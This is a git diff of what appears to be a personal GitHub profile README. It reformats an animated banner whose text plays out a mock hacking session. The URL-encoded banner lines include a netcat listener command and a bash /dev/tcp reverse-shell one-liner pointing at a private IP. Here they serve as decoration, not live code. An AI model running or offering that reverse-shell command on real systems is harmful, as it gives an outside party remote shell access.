@@ -2,7 +2,9 @@
 
 <img align="right" width="330" src="https://mir-s3-cdn-cf.behance.net/project_modules/disp/2bbf3a52005319.5901123c114f4.gif" alt="coding">
 
-<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=2700&pause=100&color=db24cf&multiline=true&width=500&height=255&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BXB3AST%5D++profile+;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.99.10%2F4444+0%3E%261;XB3AST%40profile%3A~%24+.%2Fexploit.py;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%24whoami;XB3AST" alt="Typing SVG" /></a>
+<a href="https://git.io/typing-svg">
+  <img src="https://readme-typing-svg.demolab.com?font=Fira+Code&duration=2700&pause=100&color=db24cf&multiline=true&width=500&height=270&lines=nc+-lvnp+4444;listening+on+%5Bany%5D+4444+...;connect+to+%5BXB3AST%5D+profile;bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.99.10%2F4444+0%3E%261;$+./exploit.py;...................PwN3d!......................................;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++;%23+whoami;XB3AST" alt="Typing SVG" />
+</a>
 
 <p align="left">
   <img src="https://komarev.com/ghpvc/?username=xbeast1&label=Profile%20views&color=0e75b6&style=flat" alt="xbeast1" />
